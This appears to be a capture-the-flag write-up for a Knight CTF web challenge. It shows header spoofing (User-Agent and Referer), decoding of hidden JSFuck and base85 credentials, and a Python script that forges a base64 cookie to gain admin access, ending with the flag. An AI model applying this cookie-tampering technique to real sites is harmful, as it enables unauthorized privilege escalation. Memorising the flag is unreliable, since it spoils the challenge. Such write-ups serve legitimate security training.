# Kignht CTF - Can You Be Admin

**The page said**: Only KnightSquad agents can access this page.

**I said**: 
```html
User-Agent: KnightSquad
```
**The page said**: This page refers to knight squad home network. So, Only Knight Squad home network can access this page.

**I said**: 
```html
Referer: localhost
```

Edit two above headers, at the bottom of the page, we get bunch of hidden JSFuck code:
```
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])
```
Ok, let's decode it:
```
F`V,7DIIBn+?CWe@<,q!$?0EpF*DPCA0<oU8RZI/DJ<`sF8
```
Is nonsense right, is hard but my teammate find out, is base 85, remember the format plss:
```
username : tareq
password : IamKnight
```

Logged in, we still a normal user, check the cookies, there's a cookie name User_Type with value Normal_User all base64 encode, change Normal_User to Admin, we logged in as admin:

```python
import requests
import base64

url = 'http://can-you-be-admin.kshackzone.com/dashboard.php'

cookies = {
    'PHPSESSID': 'c0bc7a8184ea78364d4b7d8d9828c34a',
    'VXNlcl9UeXBl': base64.urlsafe_b64encode('Admin'.encode()).decode(),
}

r = requests.get(url, cookies=cookies, verify=False)

print(r.text)
```

**flag**: `KCTF{FiN4LlY_y0u_ar3_4dm1N}`
